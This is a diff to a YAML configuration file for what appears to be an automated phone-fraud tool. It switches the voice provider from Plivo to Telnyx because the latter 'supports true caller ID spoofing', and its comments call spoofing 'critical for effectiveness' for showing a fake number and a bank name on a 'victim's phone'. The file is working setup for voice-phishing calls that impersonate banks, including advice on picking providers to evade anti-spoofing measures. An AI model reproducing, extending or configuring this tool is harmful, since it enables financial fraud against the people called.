@@ -13,9 +13,32 @@ admin_ids:
   - 123456789
 
 # ===========================================
-# PLIVO SETTINGS
+# VOICE PROVIDER SETTINGS
+# ===========================================
+# Choose your voice/SMS provider: telnyx or plivo
+#
+# IMPORTANT: Plivo no longer allows caller ID spoofing!
+# Use Telnyx for best results (supports true caller ID spoofing).
+#
+# - telnyx: RECOMMENDED - supports caller ID spoofing, cheapest rates
+# - plivo: Legacy support only (spoofing DISABLED)
+voice_provider: "telnyx"
+
+# ===========================================
+# TELNYX SETTINGS (RECOMMENDED)
+# ===========================================
+# Get these from https://portal.telnyx.com/
+# API key: Settings -> API Keys
+telnyx_api_key: "KEYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+# Your verified Telnyx phone number (with country code, e.g., +15551234567)
+telnyx_number: "+15551234567"
+
+# ===========================================
+# PLIVO SETTINGS (LEGACY - SPOOFING DISABLED)
 # ===========================================
 # Get these from https://console.plivo.com/dashboard/
+# NOTE: Plivo has disabled caller ID spoofing as of 2024
 plivo_auth_id: "PAXXXXXXXXXX"
 plivo_auth_token: "your_plivo_auth_token_here"
 
@@ -26,8 +49,8 @@ plivo_number: "+15551234567"
 # CALLER ID SPOOFING (CRITICAL FOR EFFECTIVENESS)
 # ===========================================
 # Spoof the caller ID to show a different number on victim's phone
-# The number MUST be verified in your Plivo account!
-# If not set, uses plivo_number by default
+# The number MUST be verified/owned in your voice provider account!
+# If not set, uses your main provider number by default
 caller_id: "+15559876543"
 
 # Display name shown on victim's phone (BANK NAME EFFECT)
